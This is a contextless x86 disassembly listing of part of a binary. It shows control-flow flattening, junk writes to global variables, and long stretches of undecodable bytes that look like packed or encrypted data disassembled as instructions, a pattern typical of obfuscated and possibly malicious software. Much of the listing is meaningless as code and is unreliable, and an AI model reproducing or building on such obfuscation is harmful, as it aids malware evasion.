  40e27d:	fs push ebx
  40e27f:	xchg   ebp,eax
  40e280:	jp     0x40e2f9
  40e282:	mov    DWORD PTR [ebp-0x18],eax
  40e285:	mov    edi,DWORD PTR [ebp+0x8]
  40e288:	inc    DWORD PTR ds:0x43368b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x433763,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x4337ab
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433717,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43368b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x433757,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43371f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43369b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43379f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x4337ab,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x43375f,0xab2
  40e324:	cmp    edi,0x33d
  40e32a:	mov    DWORD PTR ds:0x43379b,0x48b4
  40e334:	jne    0x40e3b3
  40e33a:	xor    DWORD PTR ds:0x433757,0x79d9
  40e344:	and    DWORD PTR [ebp+0x8],0x0
  40e348:	mov    eax,DWORD PTR [ebp-0x8]
  40e34b:	add    DWORD PTR ds:0x4336d3,0x4336df
  40e355:	sub    eax,DWORD PTR [ebp+0x8]
  40e358:	xor    DWORD PTR ds:0x433727,0x7a28
  40e362:	push   eax
  40e363:	sbb    DWORD PTR ds:0x433753,0x14e6
  40e36d:	mov    eax,DWORD PTR [ebp-0x4]
  40e370:	mov    DWORD PTR ds:0x433757,0x5b5
  40e37a:	add    eax,DWORD PTR [ebp+0x8]
  40e37d:	push   eax
  40e37e:	call   0x4032fa
  40e383:	mov    DWORD PTR ds:0x433683,0x5b4b
  40e38d:	inc    DWORD PTR [ebp+0x8]
  40e390:	cmp    DWORD PTR [ebp+0x8],0x52
  40e394:	mov    DWORD PTR ds:0x433683,0x3dd6
  40e39e:	jb     0x40e348
  40e3a4:	mov    DWORD PTR ds:0x433717,0x7cb6
  40e3ae:	jmp    0x40e830
  40e3b3:	mov    DWORD PTR ds:0x433683,0x6b28
  40e3bd:	cmp    edi,0x1a3
  40e3c3:	mov    DWORD PTR ds:0x43372f,0x27e
  40e3cd:	jne    0x40e58c
  40e3d3:	movzx  eax,BYTE PTR ds:0x4337ab
  40e3da:	and    DWORD PTR ds:0x43368b,eax
  40e3e0:	mov    DWORD PTR [ebp-0x60],0xf89c853d
  40e3e7:	add    DWORD PTR ds:0x4336e3,0x2f92
  40e3f1:	mov    eax,DWORD PTR [ebp-0x4]
  40e3f4:	mov    DWORD PTR [ebp-0x5c],eax
  40e3f7:	mov    eax,DWORD PTR [ebp-0x8]
  40e3fa:	mov    DWORD PTR [ebp-0x58],eax
  40e3fd:	and    eax,DWORD PTR ds:0x433793
  40e403:	jmp    0x40e53c
  40e408:	test   al,0xb5
  40e40a:	test   al,0xe6
  40e40c:	mov    cl,0xe3
  40e40e:	jo     0x40e481
  40e410:	stc    
  40e411:	ret    0x425b
  40e414:	ja     0x40e46c
  40e416:	sub    ebx,DWORD PTR [edx+0x7e7e9816]
  40e41c:	adc    bh,BYTE PTR [edi+0x7e]
  40e41f:	jle    0x40e3c4
  40e421:	cmp    dl,BYTE PTR [ecx-0x2d]
  40e424:	xchg   esi,eax
  40e425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e426:	(bad)  
  40e427:	call   0x721e50a5
  40e42c:	jb     0x40e3fe
  40e42e:	or     eax,0x73fdab74
  40e433:	shl    esi,0xfd
  40e436:	sub    BYTE PTR [ebp-0x5d],0x59
  40e43a:	out    dx,al
  40e43b:	mov    DWORD PTR [ecx-0x73],0xdb7bce5a
  40e442:	out    dx,eax
  40e443:	fcmove st,st(2)
  40e445:	dec    edx
  40e446:	mov    esi,0xcddbb9aa
  40e44b:	out    0xf1,eax
  40e44d:	ins    BYTE PTR es:[edi],dx
  40e44e:	pop    DWORD PTR [ebp-0x5e289dec]
  40e454:	shl    BYTE PTR [ebx+eiz*8],1
  40e457:	pop    esp
  40e458:	sti    
  40e459:	ret    
  40e45a:	and    ebp,DWORD PTR ds:0xa200e0ef
  40e460:	xchg   ecx,eax
  40e461:	mov    esp,0x84e4de16
  40e466:	ret    0x7cc9
  40e469:	leave  
  40e46a:	call   edx
  40e46c:	mov    ebx,eax
  40e46e:	mov    bl,0x36
  40e470:	ins    BYTE PTR es:[edi],dx
  40e471:	inc    esi
  40e472:	mov    ch,0xf
  40e474:	out    0xd8,al
  40e476:	rcr    DWORD PTR ds:0x38626282,cl
  40e47c:	xor    bh,dh
  40e47e:	sbb    BYTE PTR [edi+0x68],0xd2
  40e482:	fsubp  st(1),st
  40e484:	call   0x730fa8af
  40e489:	push   esi
  40e48a:	pop    esi
  40e48b:	fwait
  40e48c:	in     eax,0xd0
  40e48e:	adc    BYTE PTR [edx+0x77d240cb],bl
  40e494:	jp     0x40e47b
  40e496:	cmp    al,0x31
  40e498:	outs   dx,DWORD PTR ds:[esi]
  40e499:	or     cl,BYTE PTR [ebx-0x5d8c1532]
  40e49f:	jnp    0x40e4ee
  40e4a1:	out    0x4,eax
  40e4a3:	push   es
  40e4a4:	jmp    0x40e4a9
  40e4a6:	jmp    0xb680abd2
  40e4ab:	xor    eax,0x44b0770b
  40e4b0:	xor    al,ch
  40e4b2:	jno    0x40e4ae
  40e4b4:	outs   dx,DWORD PTR ds:[esi]
  40e4b5:	and    ebx,eax
  40e4b7:	out    0xd4,eax
  40e4b9:	jp     0x40e4e6
  40e4bb:	pop    esi
  40e4bc:	cli    
  40e4bd:	xor    DWORD PTR ds:0xb86cbdf4,ebp
  40e4c3:	(bad)  
  40e4c4:	jmp    0xd7de4154
  40e4c9:	xor    al,0x16
  40e4cb:	fsubr  DWORD PTR [esi-0x40]
  40e4ce:	shl    BYTE PTR [edx-0x3d],0xf
  40e4d2:	mov    eax,0xa7e99f07
  40e4d7:	ja     0x40e539
  40e4d9:	shl    BYTE PTR [edx-0x4ca2919d],1
  40e4df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4e0:	adc    al,BYTE PTR [ecx]
  40e4e2:	mov    ebx,0x147ee8b9
  40e4e7:	mov    esi,0xa866b7ba
  40e4ec:	(bad)  
  40e4ed:	out    dx,eax
  40e4ee:	or     DWORD PTR [ebx+ecx*4-0x2daa6e56],ecx
  40e4f5:	retf   0x1f88
  40e4f8:	cdq    
  40e4f9:	mov    ebx,DWORD PTR ds:0x89fdd989
  40e4ff:	imul   ebp,edx,0x3d5cf5f5
  40e505:	mov    ecx,0x8712fedf
  40e50a:	sub    DWORD PTR [eax-0x1a],esp
  40e50d:	cmp    esi,DWORD PTR [esi]
  40e50f:	inc    edx
  40e510:	mov    al,ds:0xa09aa2cb
  40e515:	pop    ss
  40e516:	xor    esp,esi
  40e518:	data16 cmp BYTE PTR [ebp+0x3b4d6d7c],0x83
  40e520:	sub    esp,DWORD PTR [ebx+0x32]
  40e523:	clc    
  40e524:	adc    dl,dh
  40e526:	aas    
  40e527:	in     eax,dx
  40e528:	imul   edx,DWORD PTR [ecx],0x9a85dcb9
  40e52e:	xor    BYTE PTR [eax+0x58],al
  40e531:	rcr    BYTE PTR [edi],1
  40e533:	in     al,0x67
  40e535:	inc    eax
  40e536:	xor    esi,DWORD PTR [edi-0x2ca2e571]
  40e53c:	mov    eax,DWORD PTR [ebp-0xc]
  40e53f:	or     DWORD PTR ds:0x433723,0x43376b
  40e549:	xor    eax,esi
  40e54b:	add    eax,ebx
  40e54d:	sbb    DWORD PTR ds:0x43375b,0x43372f
  40e557:	mov    DWORD PTR [ebp-0x54],eax
  40e55a:	lea    eax,[ebp-0x1c]
  40e55d:	mov    DWORD PTR [ebp-0x50],eax
  40e560:	mov    eax,DWORD PTR [ebp-0x60]
  40e563:	xor    eax,esi
  40e565:	add    eax,ebx
  40e567:	mov    DWORD PTR [ebp-0x60],eax
  40e56a:	lea    eax,[ebp-0x60]
  40e56d:	push   eax
  40e56e:	mov    eax,DWORD PTR [ebp+0xc]
  40e571:	xor    eax,esi
  40e573:	add    eax,ebx
  40e575:	push   eax
  40e576:	mov    eax,ds:0x413b54
  40e57b:	push   0x413aaa
  40e580:	push   DWORD PTR [eax]
  40e582:	call   0x40984d
  40e587:	jmp    0x40e830
  40e58c:	cmp    edi,0x13d
  40e592:	jne    0x40e830
  40e598:	mov    eax,DWORD PTR [ebp-0x10]
  40e59b:	xor    eax,esi
  40e59d:	add    eax,ebx
  40e59f:	mov    DWORD PTR [ebp+0x8],eax
  40e5a2:	jmp    0x40e6db
  40e5a7:	shl    BYTE PTR [eax+eax*8-0xf8f9fd0],0x74
  40e5af:	sub    eax,0xb5f261b8
  40e5b4:	nop
  40e5b5:	arpl   WORD PTR [edx+ebp*1+0x127e7e99],di
  40e5bc:	jg     0x40e63c
  40e5be:	jle    0x40e568
  40e5c0:	adc    edi,DWORD PTR [ecx+0xb]
  40e5c3:	stos   DWORD PTR es:[edi],eax
  40e5c4:	jl     0x40e59f
  40e5c6:	aaa    
  40e5c7:	cmp    BYTE PTR [edx+0x4],al
  40e5ca:	ss (bad) 
  40e5cc:	push   0xffffff97
  40e5ce:	xor    ch,dh
  40e5d0:	pop    edi
  40e5d1:	add    BYTE PTR [ebx],dl
  40e5d3:	mov    esp,es
  40e5d5:	and    dh,BYTE PTR [eax]
  40e5d7:	mov    esi,0x744dbdec
  40e5dc:	or     edi,DWORD PTR [edi+0x77]
  40e5df:	ins    DWORD PTR es:[edi],dx
  40e5e0:	add    eax,0x96f1b2ba
  40e5e5:	fdivr  st,st(2)
  40e5e7:	ins    DWORD PTR es:[edi],dx
  40e5e8:	aas    
  40e5e9:	mov    esi,0x8e865e0c
  40e5ee:	les    esi,FWORD PTR [esp+edx*2]
  40e5f1:	push   ebx
  40e5f2:	xchg   edx,eax
  40e5f3:	mov    ah,0x74
  40e5f5:	in     eax,0x75
  40e5f7:	xor    al,0x34
  40e5f9:	ss dec edx
  40e5fb:	inc    eax
  40e5fc:	pop    eax
  40e5fd:	mov    DWORD PTR [esi+ebx*8+0x762e6642],edx
  40e604:	scas   eax,DWORD PTR es:[edi]
  40e605:	adc    edi,ebx
  40e607:	rcr    DWORD PTR [ebp+edx*8-0x4c14ad0d],1
  40e60e:	push   esp
  40e60f:	pop    ebx
  40e610:	gs pop ecx
  40e612:	adc    DWORD PTR [esi+0xf96dfe0],0x9949fbc9
  40e61c:	retf   
  40e61d:	and    eax,0x25e95d82
  40e622:	rcl    BYTE PTR [edi+0x4],1
  40e625:	mov    WORD PTR [edx+0x2a],gs
  40e628:	xor    al,0xf8
  40e62a:	imul   esi,DWORD PTR [edi+0x3a],0xffffff8e
  40e62e:	cmc    
  40e62f:	lods   al,BYTE PTR ds:[esi]
  40e630:	and    al,0x6e
  40e632:	sgdtd  [ebx+eiz*2-0x26]
  40e637:	stc    
  40e638:	push   eax
  40e639:	and    dh,BYTE PTR ds:0x2df2bb27
  40e63f:	jb     0x40e698
  40e641:	add    ch,BYTE PTR [edi+esi*1+0x7]
  40e645:	icebp  
  40e646:	or     BYTE PTR [edx-0x4a500acf],al
  40e64c:	add    DWORD PTR [esi+0x28],0x342945b4
  40e653:	sbb    DWORD PTR [ecx-0x80],esp
  40e656:	sbb    eax,0x2ccc9ae1
  40e65b:	add    edi,DWORD PTR [ebx+edx*4-0x149b8816]
  40e662:	xchg   ebx,eax
  40e663:	inc    esi
  40e664:	or     DWORD PTR [ebx-0x30],0x5b7603fc
  40e66b:	ror    ecx,cl
  40e66d:	(bad)  
  40e66e:	js     0x40e66e
  40e670:	jle    0x40e6aa
  40e672:	icebp  
  40e673:	retf   0xc08
  40e676:	pop    edx
  40e677:	mov    ebp,gs
  40e679:	mov    al,ch
  40e67b:	jno    0x40e692
  40e67d:	ret    
  40e67e:	rol    DWORD PTR [edi],0x74
  40e681:	repz fnstsw WORD PTR [ecx+0x5c]
  40e685:	arpl   bp,ax
  40e687:	inc    ebp
  40e688:	pop    eax
  40e689:	pop    ecx
  40e68a:	retf   
  40e68b:	neg    DWORD PTR [ebx-0x570c86f7]
  40e691:	(bad)  
  40e692:	mov    al,ds:0x96f00659
  40e697:	cwde   
  40e698:	lods   eax,DWORD PTR ds:[esi]
  40e699:	inc    ebp
  40e69a:	sub    al,0x6f
  40e69c:	jle    0x40e633
  40e69e:	cmp    DWORD PTR [eax+0x26736b38],ecx
  40e6a4:	jmp    0x357f:0xcb4e3917
  40e6ab:	jo     0x40e66c
  40e6ad:	aas    
  40e6ae:	jmp    0xb81c:0xd5155acf
  40e6b5:	cmc    
  40e6b6:	xchg   ebx,eax
  40e6b7:	push   ds
  40e6b8:	xchg   edi,eax
  40e6b9:	sbb    al,0x7e
  40e6bb:	inc    ebp
  40e6bc:	leave  
  40e6bd:	(bad)  
  40e6be:	popf   
  40e6bf:	jg     0x40e740
  40e6c1:	xchg   edi,eax
  40e6c2:	in     al,dx
  40e6c3:	jmp    0xdd1a:0x39a5a3cd
  40e6ca:	(bad)  
  40e6cc:	pushf  
  40e6cd:	mov    ds:0x9c660323,eax
  40e6d2:	xchg   esi,eax
  40e6d3:	call   0x3d49:0xe94a0804
  40e6da:	jle    0x40e67d
  40e6dc:	xor    al,0x3b
  40e6de:	inc    ecx
  40e6df:	add    BYTE PTR [ecx+0x458b0845],cl
  40e6e5:	in     al,dx
  40e6e6:	jmp    0x40e81f
  40e6eb:	jb     0x40e70f
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	jmp    0x9bdf:0xa270706c
  40e6f5:	mov    al,BYTE PTR [ecx-0x5615928]
  40e6fb:	into   
  40e6fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6fd:	jle    0x40e77d
  40e6ff:	adc    bh,BYTE PTR [edi+0x7e]
  40e702:	jle    0x40e721
  40e704:	cmp    ecx,DWORD PTR [ebp-0x2c36a1fe]
  40e70a:	adc    al,0x17
  40e70c:	mov    ebp,0xa11a8454
  40e711:	lods   eax,DWORD PTR ds:[esi]
  40e712:	and    al,0x1
  40e714:	xchg   DWORD PTR ds:0xd9d7a404,ebx
  40e71a:	jb     0x40e711
  40e71c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e71d:	jbe    0x40e783
  40e71f:	dec    eax
  40e720:	fdecstp 
  40e722:	pop    eax
  40e723:	pop    edi
  40e724:	push   eax
  40e725:	dec    edx
  40e726:	out    0x79,al
  40e728:	(bad)  
  40e729:	dec    esp
  40e72a:	imul   ebp,DWORD PTR ds:0xeafbd7c5,0xf21d175b
  40e734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e735:	xchg   edi,eax
  40e736:	gs add al,0xfc
  40e739:	into   
  40e73a:	ds jle 0x40e71c
  40e73d:	sbb    al,0xd6
  40e73f:	iret   
  40e740:	sub    cl,BYTE PTR [esi-0x3099d3b5]
  40e746:	cmc    
  40e747:	leave  
  40e748:	push   cs
  40e749:	mov    ecx,0x7eced2d1
  40e74e:	std    
  40e74f:	sbb    DWORD PTR [ecx+eax*2+0x7ff7eaf7],esi
  40e756:	nop
  40e757:	push   esp
  40e758:	add    edi,ebx
  40e75a:	lock test DWORD PTR [ebx+edi*8-0x1222ae89],0x69d6221d
  40e766:	stos   DWORD PTR es:[edi],eax
  40e767:	mov    BYTE PTR [edx-0x4b9bd479],bl
  40e76d:	mov    dl,0x70
  40e76f:	inc    ebp
  40e770:	(bad)  
  40e771:	mov    esi,0xfaaaaa58
  40e776:	mov    eax,0x21af8fe1
  40e77b:	sub    ebx,DWORD PTR [ebp-0x3f]
  40e77e:	pop    ss
  40e77f:	fwait
  40e780:	xor    bl,ch
  40e782:	and    esp,DWORD PTR [ebx-0x6a]
  40e785:	inc    di
  40e787:	aas    
  40e788:	adc    esp,DWORD PTR ds:0x14d1f28e
  40e78f:	inc    edx
  40e790:	and    dl,BYTE PTR [edx+esi*1+0xb98ebbc]
  40e797:	dec    esi
  40e798:	repnz add edx,DWORD PTR [edx]
  40e79b:	sbb    edx,DWORD PTR [ecx-0x6c]
  40e79e:	fs adc al,0xae
  40e7a1:	push   0x262e3f7a
  40e7a6:	adc    DWORD PTR [ecx-0x53],edi
  40e7a9:	or     DWORD PTR [edi+0x3b],esp
  40e7ac:	and    eax,0xabef050
  40e7b1:	sti    
  40e7b2:	jge    0x40e7c9
  40e7b4:	das    
  40e7b5:	ret    
  40e7b6:	push   0xffffff82
  40e7b8:	imul   bl
  40e7ba:	push   ds
  40e7bb:	add    edx,DWORD PTR [edx+0x27e5c280]
  40e7c1:	mov    ds:0x169c1ab7,eax
  40e7c6:	es scas al,BYTE PTR es:[edi]
  40e7c8:	sar    DWORD PTR [edi],1
  40e7ca:	loopne 0x40e7ec
  40e7cc:	pop    edi
  40e7cd:	pop    ds
  40e7ce:	idiv   DWORD PTR [ebp+ecx*8+0x1e]
  40e7d2:	stos   BYTE PTR es:[edi],al
  40e7d3:	pushf  
  40e7d4:	retf   0xe311
  40e7d7:	dec    esp
  40e7d8:	pop    ebp
  40e7d9:	imul   edx,DWORD PTR [edi],0xfffffff5
  40e7dc:	fidivr WORD PTR [edx+0x55]
  40e7df:	pop    ecx
  40e7e0:	mov    al,ds:0xbda36229
  40e7e5:	adc    DWORD PTR [edx+0x4690339a],ebp
  40e7eb:	or     al,0x6f
  40e7ed:	in     al,dx
  40e7ee:	jne    0x40e82a
  40e7f0:	(bad)  
  40e7f1:	xor    dh,BYTE PTR [edi+0x13]
  40e7f4:	push   es
  40e7f5:	cmp    eax,0xbbff2031
  40e7fa:	imul   edi,DWORD PTR [edi-0x33],0xffffffcd
  40e7fe:	inc    eax
  40e7ff:	shl    DWORD PTR [esp],1
  40e802:	and    esi,DWORD PTR ds:0x83b46fc3
  40e808:	mov    ds:0x84f4f3b4,al
  40e80d:	in     eax,0x54
  40e80f:	sub    bl,dh
  40e811:	xor    eax,0x624e6105
  40e816:	xchg   ebp,eax
  40e817:	or     DWORD PTR [eax],ecx
  40e819:	jmp    0x40e806
  40e81b:	xor    ebx,DWORD PTR [edi+0x7c]
  40e81e:	das    
  40e81f:	mov    DWORD PTR [ebp-0x4],eax
  40e822:	mov    eax,DWORD PTR [ebp-0x4]
  40e825:	push   0x4
  40e827:	pop    ecx
  40e828:	sub    ecx,eax
  40e82a:	add    ecx,DWORD PTR [ebp-0x18]
  40e82d:	mov    DWORD PTR [ebp-0x8],ecx
  40e830:	mov    eax,DWORD PTR [ebp+0xc]
  40e833:	xor    eax,esi
  40e835:	lea    edi,[edi+eax*1+0x32729b]
  40e83c:	cmp    edi,0x50b
  40e842:	jmp    0x40e97b
  40e847:	xor    al,0xd8
  40e849:	xchg   ebx,eax
  40e84a:	das    
  40e84b:	push   ebx
  40e84c:	jne    0x40e7fe
  40e84e:	loope  0x40e887
  40e850:	jecxz  0x40e800
  40e852:	loope  0x40e85e
  40e854:	mov    al,0xab
  40e856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e857:	loop   0x40e800
  40e859:	jle    0x40e8d9
  40e85b:	adc    bh,BYTE PTR [edi+0x7e]
  40e85e:	jle    0x40e83c
  40e860:	inc    esi
  40e861:	sub    eax,0x96af7e96
  40e866:	mov    ds,WORD PTR [ecx]
  40e868:	mov    ebx,0x7a1ff069
  40e86d:	or     edx,DWORD PTR [ebx]
  40e86f:	lea    ebp,[esi-0x36c2805e]
  40e875:	sbb    DWORD PTR [ecx+esi*1-0x36752415],edi
  40e87c:	xor    eax,0x480a5932
  40e881:	sbb    BYTE PTR [esi-0x2a5124f0],dl
  40e887:	dec    edi
  40e888:	push   esp
  40e889:	arpl   cx,dx
  40e88b:	pop    DWORD PTR ds:0xb24195d9
  40e891:	in     eax,dx
  40e892:	xchg   ebp,eax
  40e893:	leave  
  40e894:	inc    ebp
  40e895:	dec    ebx
  40e896:	add    BYTE PTR [edi-0x47],0xec
  40e89a:	fdivr  DWORD PTR [ebp-0x3b]
  40e89d:	dec    edx
  40e89e:	mov    DWORD PTR ds:0x9ada237e,edx
  40e8a4:	ss jle 0x40e86d
  40e8a7:	xlat   BYTE PTR ds:[ebx]
  40e8a8:	out    dx,eax
  40e8a9:	fsubr  DWORD PTR [edx]
  40e8ab:	shr    ebp,cl
  40e8ad:	mov    edi,0xc7d1a000
  40e8b2:	ins    DWORD PTR es:[edi],dx
  40e8b3:	outs   dx,BYTE PTR ds:[esi]
  40e8b4:	dec    edx
  40e8b5:	jbe    0x40e83d
  40e8b7:	pop    edi
  40e8b8:	sahf   
  40e8b9:	sbb    al,0xe9
  40e8bb:	sub    eax,0x6634d18a
  40e8c0:	add    al,0xe1
  40e8c2:	lahf   
  40e8c3:	adc    eax,0xa4729a79
  40e8c8:	pop    es
  40e8c9:	fcomp  QWORD PTR [edi-0x1a8e6]
  40e8cf:	daa    
  40e8d0:	enter  0x2f1,0xc0
  40e8d4:	fwait
  40e8d5:	addr16 mov bl,0xc3
  40e8d8:	daa    
  40e8d9:	fcom   DWORD PTR [ebx+0x28]
  40e8dc:	add    edx,DWORD PTR [ecx-0x122afc03]
  40e8e2:	enter  0x58a,0x86
  40e8e6:	mov    dh,0x39
  40e8e8:	jmp    0xaf03e399
  40e8ed:	in     al,0x78
  40e8ef:	add    DWORD PTR [ecx+0x8b7059c],edi
  40e8f5:	mov    eax,ds:0x768fd770
  40e8fa:	nop
  40e8fb:	out    dx,al
  40e8fc:	fcomp  DWORD PTR [edi-0x1d]
  40e8ff:	in     eax,dx
  40e900:	push   es
  40e901:	jmp    0x40e917
  40e903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e904:	push   ebx
  40e905:	popa   
  40e906:	pushf  
  40e907:	(bad)  
  40e908:	xchg   DWORD PTR [edi-0x41ffbd3e],ecx
  40e90e:	adc    ebp,DWORD PTR [ecx-0x5b]
  40e911:	in     al,0xc2
  40e913:	sub    edx,DWORD PTR [eax*4+0x62e9a491]
  40e91a:	test   cl,al
  40e91c:	mov    al,ds:0x921f095d
  40e921:	sbb    ah,BYTE PTR [eax-0x6b152281]
  40e927:	sbb    ebp,edi
  40e929:	leave  
  40e92a:	aad    0xdf
  40e92c:	xchg   ebp,eax
  40e92d:	das    
  40e92e:	and    bl,bl
  40e930:	lods   al,BYTE PTR ds:[esi]
  40e931:	fild   QWORD PTR es:[ebx+eax*4]
  40e935:	ja     0x40e980
  40e937:	sub    edi,DWORD PTR [edi]
  40e939:	xlat   BYTE PTR ds:[ebx]
  40e93a:	in     al,0x46
  40e93c:	mov    ?,WORD PTR [ecx]
  40e93e:	outs   dx,DWORD PTR ds:[esi]
  40e93f:	(bad)  
  40e940:	das    
  40e941:	sub    DWORD PTR [esi+ebp*2-0x11],edx
  40e945:	rcr    dl,1
  40e947:	push   0x4f
  40e949:	daa    
  40e94a:	ja     0x40e93f
  40e94c:	dec    esp
  40e94d:	jno    0x40e8dc
  40e94f:	dec    edx
  40e950:	nop
  40e951:	push   ss
  40e952:	ds mov cl,0x3c
  40e955:	sbb    esp,DWORD PTR [edx]
  40e957:	mov    esi,0x5103bbd5
  40e95c:	not    BYTE PTR [ebx-0x1361233]
  40e962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e963:	or     ebx,DWORD PTR [esi]
  40e965:	cs add eax,0x808b40de
  40e96b:	cmp    ebp,DWORD PTR [edx]
  40e96d:	jmp    0xf4df:0xedfdaa4a
  40e974:	stos   BYTE PTR es:[edi],al
  40e975:	mov    dl,0x1d
  40e977:	out    dx,eax
  40e978:	jmp    0xf93e:0x850fe87d
  40e97f:	(bad)  
  40e980:	dec    DWORD PTR [ebx+0x335f0c45]
  40e986:	(bad)  
  40e987:	pop    esi
  40e988:	jmp    0x40eac1
  40e98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e98e:	sbb    bl,dh
  40e990:	loope  0x40ea05
  40e992:	icebp  
  40e993:	mov    ch,0x58
  40e995:	jns    0x40e920
  40e997:	add    eax,0xc89edb1d
  40e99c:	jmp    0x40e924
  40e99e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e99f:	jle    0x40ea1f
  40e9a1:	adc    bh,BYTE PTR [edi+0x7e]
  40e9a4:	jle    0x40e999
  40e9a6:	fcomp  QWORD PTR [edi+edx*1+0x5f6945fe]
  40e9ad:	stc    
  40e9ae:	xor    DWORD PTR [edi],eax
  40e9b0:	xchg   esi,eax
  40e9b1:	leave  
  40e9b2:	and    ebp,DWORD PTR [eax-0x55]
  40e9b5:	outs   dx,BYTE PTR ds:[esi]
  40e9b6:	jnp    0x40e9ad
  40e9b8:	adc    eax,0xf3fae50d
  40e9bd:	push   eax
  40e9be:	xchg   edx,eax
  40e9bf:	jl     0x40ea1c
  40e9c1:	adc    BYTE PTR [ebx],0x88
  40e9c4:	sub    eax,0xf70808d6
  40e9c9:	lds    edi,FWORD PTR [eax+eax*1+0x7240ee3b]
  40e9d0:	mov    ebp,0x99ceb0f2
  40e9d5:	and    esi,DWORD PTR [edi]
  40e9d7:	xlat   BYTE PTR ds:[ebx]
  40e9d8:	shl    bl,0x1a
  40e9db:	scas   eax,DWORD PTR es:[edi]
  40e9dc:	mov    ebp,0xad4583d5
  40e9e1:	dec    esp
  40e9e2:	test   DWORD PTR [edx],ebx
  40e9e4:	dec    esi
  40e9e5:	sbb    ch,bl
  40e9e7:	push   0x5b
  40e9e9:	add    ch,ah
  40e9eb:	lods   al,BYTE PTR ds:[esi]
  40e9ec:	mov    DWORD PTR [eax+0x3b1a68ef],ebx
  40e9f2:	imul   ebp,edi,0xc5e68318
  40e9f8:	rol    DWORD PTR [ecx+0x5e77a2a7],cl
  40e9fe:	sbb    DWORD PTR [ebx],esi
  40ea00:	es cmp al,0x1f
  40ea03:	xor    BYTE PTR [edi+edi*4-0x71393307],0x9e
  40ea0b:	repnz pop esi
  40ea0d:	stc    
  40ea0e:	scas   eax,DWORD PTR es:[edi]
  40ea0f:	mov    esp,0xf7aa438a
  40ea14:	out    0xc8,eax
  40ea16:	sahf   
  40ea17:	xchg   DWORD PTR [eax-0x45],eax
  40ea1a:	and    bh,cl
  40ea1c:	lods   eax,DWORD PTR ds:[esi]
  40ea1d:	or     al,0xd8
  40ea1f:	sbb    ebx,0xbbe1eed2
  40ea25:	mov    ch,0xf9
  40ea27:	mov    al,ds:0x83bed83d
  40ea2d:	(bad)  
  40ea2e:	addr16 sti 
  40ea30:	xchg   DWORD PTR [edx],eax
  40ea32:	aad    0xa8
  40ea34:	mov    ebx,0x60946c41
  40ea39:	lods   eax,DWORD PTR ds:[esi]
  40ea3a:	xlat   BYTE PTR ds:[ebx]
  40ea3b:	xor    bl,bl
  40ea3d:	xor    al,BYTE PTR [ebx-0x4a2db792]
  40ea43:	mov    bl,0x60
  40ea45:	(bad)  
  40ea46:	out    dx,eax
  40ea47:	and    ah,al
  40ea49:	pop    es
  40ea4a:	xor    eax,0xb6fe5185
  40ea4f:	mov    eax,ds:0x9aba1e70
  40ea54:	push   ebp
  40ea55:	into   
  40ea56:	inc    ecx
  40ea57:	mov    bh,0x81
  40ea59:	lds    ebx,FWORD PTR [ecx+0x48889f27]
  40ea5f:	fwait
  40ea60:	pop    ss
  40ea61:	push   0x4103ccb5
  40ea66:	xchg   ebp,eax
  40ea67:	cwde   
  40ea68:	mov    edi,0x8800907c
  40ea6d:	popa   
  40ea6e:	jo     0x40eaae
  40ea70:	pop    ecx
  40ea71:	retf   0x8244
  40ea74:	jl     0x40ea7c
  40ea76:	mov    ds,edx
  40ea78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea79:	xchg   ecx,eax
  40ea7a:	mov    esi,0x7c7db9de
  40ea7f:	adc    edx,0xc
  40ea82:	cmp    ebx,esi
  40ea84:	lahf   
  40ea85:	fldcw  WORD PTR [edi+0x37ed296e]
  40ea8b:	in     eax,dx
  40ea8c:	xor    al,0x54
  40ea8e:	retf   
  40ea8f:	adc    bl,BYTE PTR [edx+edi*2-0x7e82a6f5]
  40ea96:	(bad)  
  40ea98:	cwde   
  40ea99:	jnp    0x40ea61
  40ea9b:	sub    eax,0x6cfea6b7
  40eaa0:	sub    bh,BYTE PTR [edi]
  40eaa2:	sub    cl,bl
  40eaa4:	std    
  40eaa5:	out    0x17,eax
  40eaa7:	and    eax,0xdd30532e
  40eaac:	(bad)  
  40eaad:	repz push esp
  40eaaf:	(bad)  
  40eab0:	push   edi
  40eab1:	lds    esi,FWORD PTR [esi]
  40eab3:	(bad)  
  40eab4:	(bad)  
  40eab5:	and    ebx,eax
  40eab7:	into   
  40eab8:	jecxz  0x40ea7e
  40eaba:	jmp    0x66fc:0x80fac311
  40eac1:	add    eax,ebx
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433713,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433713,0x0
  40eadd:	je     0x40eb79
